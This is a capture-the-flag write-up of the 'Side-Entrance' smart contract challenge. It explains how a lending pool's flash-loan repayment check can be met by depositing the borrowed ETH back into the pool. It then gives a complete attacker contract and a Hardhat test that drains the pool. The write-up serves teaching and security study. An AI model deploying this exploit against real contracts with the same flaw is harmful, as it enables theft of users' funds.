# Side-Entrance

## Introduction
The goal of this box is to siphon 1000ETHs in an existing lending pool.

## Code Breakdown
Similiar to Truster box, it only has 1 smart contract ***SideEntranceLenderPool.sol***.
Let's start by looking at the variables.
```
using Address for address payable;
mapping (address => uint256) private balances;
```
The address variable uses openzeppelin library to offer more functions.
Reference: <https://docs.openzeppelin.com/contracts/3.x/api/utils#Address>

Whereas, a simple hashmap is made for ***balances*** where each address contains *x* amount of tokens in integer format.
Reference: <https://medium.com/upstate-interactive/mappings-in-solidity-explained-in-under-two-minutes-ecba88aff96e>

The first function is an interface. It is empty and it contains an ***execute()*** function.
```
interface IFlashLoanEtherReceiver {
    function execute() external payable;
}
```

The next function is ***desposit***.
It is simple where it stores the value directly into the hashmap.
```
function deposit() external payable {
    balances[msg.sender] += msg.value;
}
```

Next, a ***withdraw()*** function is created for users to withdraw their tokens out to their wallet. Even though it does not have any reentrancy guard, it follows the best practice outlined by Solidity documentation - [Checks-Effect-Interactions Pattern](https://docs.soliditylang.org/en/v0.8.16/security-considerations.html#use-the-checks-effects-interactions-pattern).

```
function withdraw() external {
    uint256 amountToWithdraw = balances[msg.sender];
    balances[msg.sender] = 0;
    payable(msg.sender).sendValue(amountToWithdraw);
}
```

Lastly, ***flashLoan(uin256 amount)*** function is created. 
As usual, it checks if the pool have sufficient ETH for borrowing.
```
uint256 balanceBefore = address(this).balance;
require(balanceBefore >= amount, "Not enough ETH in balance");
```

Next, it executes an interface function .
```
IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
```

Lastly, it checks if the loan is returned to the lending pool.
```
require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");        
```

## Hints
First and foremost, there are two pool of funds - lending pool and individual balance pool. Both are identified based on their address. Here's the problem, the lending pool and individual balance pool have overlaps. 

Consider this scenario:
A lending pool has an address.
Since it's an address, it have an individual lending balance pool too.
Let's assign 10 ETH to the lending pool. Notice that the individual Balance pool is 0.

| Lending Pool (address(this).balance) | Individual Balance Pool (balances(address(this))|
|--------|-------|
| 10 ETH | 0 ETH |


This essentially means ```address(this).balance != balances(address(this))```.
Here's the loophole, if we transfer 10 ETH to the individual balance pool, the lending pool will still reflect 10 ETH due to the call ```address(this).balance```. 

| Lending Pool (address(this).balance) | Individual Balance Pool (balances(address(this))|
|--------|--------|
| 10 ETH | 10 ETH |

Understanding this concept, we can bypass the final check in the ***flashLoan*** function. 
```
require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");        
```

We can use the function ***deposit()*** to transfer ETH from the lending pool to the individual balance pool.
Once the ETH is in the individual balance pool, we can use ***withdraw()*** to extract the token into address wallet. Since the smart contract is using ***Address.sol*** which does not require sender to have any approval, we can send the tokens from the individual balance pool to the attacker

## Solutions
A new smart contract is created for this solution.
```
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "../side-entrance/SideEntranceLenderPool.sol";

/**
 * @title SideEntranceAttacker
 * @author BingleBangle-BH's attacker contract
 */

 contract SideEntranceAttacker{
    using Address for address payable;
    SideEntranceLenderPool public immutable pool;

    constructor (SideEntranceLenderPool _pool){
        pool = SideEntranceLenderPool(_pool);
    }

    function execute() public payable{
        pool.deposit{value: msg.value}();
    }

    function stealFunds() external{
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        address _owner = msg.sender;
        payable(_owner).sendValue(address(this).balance);
    }

    receive () external payable {}
 }
```

Here's the javascript
```js
it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */
    const SideEntranceAttack = await ethers.getContractFactory('SideEntranceAttacker', attacker);
    this.attackpool = await SideEntranceAttack.deploy(this.pool.address);
    await this.attackpool.stealFunds();
});
```
